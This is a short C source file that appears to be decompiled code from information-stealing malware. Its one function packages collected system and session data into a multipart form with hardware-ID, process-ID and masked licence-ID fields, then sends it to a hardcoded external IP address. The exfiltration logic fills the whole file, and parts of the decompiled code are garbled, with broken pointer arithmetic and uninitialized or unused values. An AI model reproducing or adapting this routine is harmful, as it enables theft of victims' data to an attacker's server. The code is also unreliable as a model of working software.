#include "Header.h"

int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
{
    uint32_t sessionID = (uint32_t)SysInfo[1];
    int32_t* dataPointer = *(uint32_t*)SysInfo;
    char* sessionStr = AllocateStringBuffer();
    __ltoa(sessionID, sessionStr, 10);
    void* buffer = nullptr;
    char* tempBuffer = nullptr;
    
    if (dataPointer)
    {
        CleanupData(dataPointer);
        ProcessData(dataPointer);
        buffer = *(uint32_t*)dataPointer;
        void* tempStorage = buffer;
        int32_t flag = 1;
        char* allocatedMemory = AllocateMemory();
        tempBuffer = allocatedMemory;
        CopyData(allocatedMemory, *(uint32_t*)(dataPointer[18] + 72), buffer);
        HandleProcessing(dataPointer, 1);
        FinalizeData(dataPointer, 1);
        _free(dataPointer);
    }
    
    int32_t bufferSize = 2048;
    char* headerBuffer = AllocateStringBuffer();
    void* adjustedBuffer = (char*)buffer + 0x1000;
    void* requestData = AllocateStringBuffer();
    char const* const contentType = "Content-Type: multipart/form-data";
    PSTR formattedData = convertWideToAnsi(&globalData);
    char currentChar;

    do
    {
        currentChar = *(uint8_t*)contentType;
        *(uint8_t*)(headerBuffer - "Content-Type: multipart/form-data" + contentType) = currentChar;
        contentType = &contentType[1];
    } while (currentChar);

    PSTR charPointer = formattedData;
    PSTR stringEnd;

    do
    {
        stringEnd = *(uint8_t*)charPointer;
        charPointer = &charPointer[1];
    } while (stringEnd);

    CopyData(&headerBuffer[44], formattedData, charPointer - &charPointer[1]);

    char nextChar;
    do
    {
        nextChar = *(uint8_t*)formattedData;
        formattedData = &formattedData[1];
    } while (nextChar);
    
    int32_t responseStatus = 0;
    *(uint8_t*)(formattedData - &formattedData[1] + headerBuffer + 44) = nextChar;
    
    char* requestID;
    int32_t processingCode;
    requestID = GenerateRequestID();
    ProcessRequest(&responseStatus, processingCode, requestData, tempBuffer, buffer, &responseStatus);
    AddRequestParameter(&responseStatus, "hwid", requestData, requestID, &responseStatus);
    AddRequestParameter(&responseStatus, "pid", requestData, sessionStr, &responseStatus);
    AddRequestParameter(&responseStatus, "lid", requestData, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", &responseStatus);
    
    convertWideToAnsi(u"195.123.226.91");
    SendWebRequest(headerBuffer, requestData, responseStatus);
    
    return _free(tempBuffer);
}
